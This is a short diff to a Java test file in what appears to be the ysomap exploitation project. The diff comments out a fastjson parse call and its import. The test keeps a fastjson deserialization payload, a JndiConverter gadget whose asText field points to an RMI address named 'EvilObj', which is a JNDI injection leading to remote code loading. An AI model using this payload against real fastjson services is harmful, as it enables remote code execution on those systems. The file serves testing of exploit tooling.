@@ -3,7 +3,6 @@
  */
 package ysomap;
 
-import com.alibaba.fastjson.JSON;
 import org.junit.Test;
 
 public class AppTest {
@@ -11,6 +10,6 @@ public class AppTest {
         String jsonObject =
                 "{\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\"," +
                         "\"asText\":\"rmi://localhost:1099/EvilObj\"}";
-        JSON.parseObject(jsonObject);
+//        JSON.parseObject(jsonObject);
     }
 }
